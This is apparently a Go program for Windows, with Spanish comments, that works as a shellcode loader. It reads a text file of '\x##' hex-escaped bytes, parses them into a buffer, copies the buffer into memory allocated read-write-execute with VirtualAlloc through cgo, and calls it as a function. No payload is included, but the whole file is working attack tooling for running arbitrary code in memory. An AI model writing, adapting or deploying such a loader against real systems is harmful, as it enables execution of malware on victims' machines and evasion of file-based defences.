//go:build windows

package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"unsafe"
)

/*
#cgo LDFLAGS: -lkernel32
#include <windows.h>
#include <string.h>

static void execute_shellcode(unsigned char* sc, unsigned int sc_len) {
    LPVOID memory = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (memory == NULL) return;

    memcpy(memory, sc, sc_len);
    ((void(*)())memory)();
}
*/
import "C"

func executeLoader(shellcodeFile string) {
	shellcode, err := readShellcodeFromFile(shellcodeFile)
	if err != nil {
		fmt.Printf("Error reading shellcode file: %v\n", err)
		os.Exit(1)
	}

	if len(shellcode) == 0 {
		fmt.Printf("Error: No shellcode bytes found in file\n")
		os.Exit(1)
	}

	fmt.Printf("Loaded %d bytes of shellcode\n", len(shellcode))

	C.execute_shellcode(
		(*C.uchar)(unsafe.Pointer(&shellcode[0])),
		C.uint(len(shellcode)),
	)
}

func readShellcodeFromFile(filename string) ([]byte, error) {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	text := string(content)
	var shellcode []byte

	// Encontrar la línea que contiene los bytes
	lines := strings.Split(text, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// Buscar patrón \x## en cada línea
		for i := 0; i < len(line)-3; i++ {
			if line[i] == '\\' && line[i+1] == 'x' {
				hexStr := line[i+2 : i+4]
				if len(hexStr) == 2 {
					if b, err := strconv.ParseUint(hexStr, 16, 8); err == nil {
						shellcode = append(shellcode, byte(b))
					}
				}
				i += 3
			}
		}
	}

	fmt.Printf("Loaded %d bytes\n", len(shellcode))
	return shellcode, nil
}
